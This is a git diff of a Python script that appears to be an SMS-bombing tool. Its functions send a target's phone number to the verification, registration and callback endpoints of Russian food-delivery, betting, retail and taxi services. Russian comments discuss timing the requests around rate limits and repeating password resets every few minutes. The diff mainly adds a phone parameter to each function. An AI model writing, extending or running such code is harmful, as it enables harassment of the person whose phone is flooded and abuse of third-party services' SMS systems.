@@ -36,7 +36,7 @@ def pizzapan(phone):
     print(response_pizzapan)
 
 
-def dostaevsky():
+def dostaevsky(phone):
     dstvskphn = '+7 ' + phone[:3] + ' ' + phone[3:6] + '-' + phone[6:8] + '-' + phone[8:10]
     headers = {
         'phone': dstvskphn
@@ -57,7 +57,7 @@ def pizzasushiwok(phone):
     print(response_pizzasushiwok)
 
 
-def ipizza():
+def ipizza(phone):
     ipzzphn = '%2B7' + '+' + '(' + phone[:3] + ')' + '+' + phone[3:6] + '-' + phone[6:8] + '-'\
               + phone[8:10]
     headers = {
@@ -67,7 +67,7 @@ def ipizza():
     response_ipizza = requests.post(url='https://ipizza.ru/xml/api/callback/', headers=headers)
     print(response_ipizza)
 
-# тут мне было впадлу сделать параметр, ес чо надо только номер подставить
+
 def okeansushi(phone):
     oknsshphn = '8' + '+' + '(' + phone[:3] + ')' + '+' + phone[3:6] + '-' + phone[6:8] +\
                 '-' + phone[8:10]
@@ -78,16 +78,16 @@ def okeansushi(phone):
                                              '=45&pravila2=on'))
     print(response_okeansushi)
 
-# тоже немного пидорский формат номера, fix me
-def sunlight():
+
+def sunlight(phone):
     snlghtphn = '7'+phone
     response_sunlight = requests.post(url='https://api.sunlight.net/v3/customers/authorization/',
                                       json={"phone": snlghtphn})
     print(response_sunlight)
 
-# уебищное форматирование номера, fix me
+
 # тут если слать чаще чем раз примерно в минуту - ту мэни реквестс, надо таймер на минуту ставить
-def bk():
+def bk(phone):
     bkphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
             '-' + phone[8:10]
     response_bk = requests.post(url='https://deliverysmart.burgerking.ru/account/session',
@@ -96,7 +96,7 @@ def bk():
     print(response_bk)
 
 # ваще хз, надо тестить, но должно работать, сначала регает, потом ресторит пароль раз в 3 минуты
-def olimpbet():
+def olimpbet(phone):
     olmpphn = '7'+phone
     response_olimpbet = requests.post(url='https://www.olimp.bet/api/smsregistration',
                                       json={"lang_id": "0", "platforma": "SITE_CUPIS",
@@ -113,7 +113,7 @@ def olimpbet():
 
 #  тут какой-то таймаут, надо тестить, мне лень сейчас сидеть и засекать, вроде минута,
 #  но оно как-то хз работает
-def kfc():
+def kfc(phone):
     kfcphn = '+7'+phone
     response_kfc = requests.post(url=('https://app-api.kfc.ru/api/v1/'
                                       'common/auth/send-validation-sms'),
@@ -129,7 +129,7 @@ def taxinonstop(phone):
     print(response_taxinonstop)
 
 
-def generate_email():
+def generate_email(phone):
     """
     Generate e-mail
     :return: string email
@@ -146,12 +146,12 @@ def generate_email():
 #  pizzalarenzo(phone)
 #  tarelochka(phone)
 #  pizzapan(phone)
-#  dostaevsky()
+#  dostaevsky(phone)
 #  pizzasushiwok(phone)
-#  ipizza()
-#  sunlight()
-#  bk()
-#  olimpbet()
-#  kfc()
+#  ipizza(phone)
+#  sunlight(phone)
+#  bk(phone)
+#  olimpbet(phone)
+#  kfc(phone)
 #  taxinonstop(phone)
 #  test commit
